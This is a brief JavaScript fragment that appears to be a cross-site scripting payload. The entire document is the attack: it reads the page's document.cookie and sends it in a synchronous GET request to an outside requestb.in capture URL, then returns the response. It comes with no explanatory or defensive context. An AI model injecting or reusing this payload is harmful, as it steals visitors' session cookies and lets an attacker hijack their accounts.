var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "https://requestb.in/vfdi86vf?cookie="+document.cookie, false );
xmlHttp.send( null );
return xmlHttp.responseText;


